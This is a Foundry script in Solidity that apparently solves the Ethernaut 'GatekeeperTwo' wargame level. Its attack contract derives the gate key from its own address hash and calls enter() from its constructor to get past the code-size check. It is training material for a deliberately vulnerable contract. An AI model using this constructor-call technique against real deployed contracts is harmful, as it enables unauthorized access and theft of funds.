// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackContract {
    constructor(GatekeeperTwo gatekeeperTwo) {

        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gatekeeperTwo.enter(gateKey);

        console.log("After : ", gatekeeperTwo.entrant());
    }
}

contract GateKeeperTwoSolution is Script {

    address target = 0xca75B3ED018D8947925C71fc40BC737fd42fEE96;
    GatekeeperTwo gatekeeperTwo = GatekeeperTwo(target);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Before : ", gatekeeperTwo.entrant());

        new AttackContract(gatekeeperTwo);
        vm.stopBroadcast();
    }
}